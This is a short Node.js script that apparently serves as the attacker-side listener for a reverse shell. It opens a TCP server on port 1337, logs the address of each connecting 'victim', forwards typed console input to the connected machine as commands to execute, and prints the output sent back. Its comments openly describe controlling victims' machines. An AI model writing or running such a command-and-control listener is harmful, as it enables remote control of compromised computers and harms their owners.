var net = require('net');
var stdin = process.openStdin();

var server = net.createServer(function(connection) { 
   //log victims ip and port they used to connect to our shell
   console.log('client connected # ', connection.remoteAddress + ':' + connection.remotePort);
   connection.on('end', function() {
      //Check if the client disconnected
      console.log('client disconnected');
   });
   //listen for console input
   stdin.addListener("data", function(d) {
   //send console input as the command which will be executed on the clients side
   connection.write(d.toString());
   });
   //log the data which has been send back by the victim (client)
   connection.on('data', function(d){
   console.log(d.toString())
   });
});
//server listening on port 1337
server.listen(1337, function() { 
   console.log('server is listening');
});
